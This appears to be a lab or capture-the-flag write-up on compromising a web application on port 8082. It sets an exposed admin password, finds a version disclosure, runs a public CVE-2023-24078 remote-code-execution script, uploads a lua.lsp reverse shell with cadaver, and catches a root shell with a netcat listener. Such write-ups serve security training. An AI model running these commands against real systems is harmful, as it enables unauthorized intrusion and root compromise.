Navigating to [http://192.168.227.25/](http://192.168.227.25/) we have a **"403 Forbidden"** message from a web server known as nginx


![](https://i.imgur.com/Nkq6YCA.png)

Whereas checking [http://192.168.227.25:8082/](http://192.168.227.25:8082/) we are asked to set an administrator password first (Baaaddd Security!! :{)

![](https://i.imgur.com/XU9QKCX.png)


Successfully set up the administrator password and username

![](https://i.imgur.com/Cd648Mf.png)


Navigating to the about section of this page i found a version disclosure



![](https://i.imgur.com/dMd7u9s.png)


searching for an exploit, I found [this](https://github.com/overgrowncarrot1/CVE-2023-24078) Authenticated Remote Code Execution vulnerability 


![](https://i.imgur.com/P3YwsS9.png)


However running this exploit gave us this error, Looks like it is trying to create and admin user but can't because we have already done that, we can go ahead and revert the box then try again


![](https://i.imgur.com/weVhqzj.png)


Running the exploit we get another browser pop-up, make sure to leave it open, according to the instructions the exploit has created a `lua.lsp` file for us locally that contains our reverse shell, let go ahead and do this


```bash
python3 CVE-2023-24078.py -p 4444 -l 192.168.45.209 -r 192.168.227.25 -P 8082
```


![](https://i.imgur.com/M4AiPru.png)


First of all on the new popped-up browser you should see a link make sure to copy the link has this is the location we are uploading our reverse shell to


![](https://i.imgur.com/3VTOOg5.png)


Now run `cadaver` in which folder the `lua.lsp` file was created in and upload the file to the web application

```bash
cd CVE-2023-24078
cadaver http://192.168.227.25:8082/fs/d0ffb9d2dccff24883a23236/
cd ..

# Username: adm1n
# Password: *********

put lua.lsp
```

Start up your listener with netcat then navigate back to the major exploit page and hit the "**Enter**" key on your keyboard and you should have your shell back


```
nc -lvnp 4444
```

Then we have our reverse shell back as root
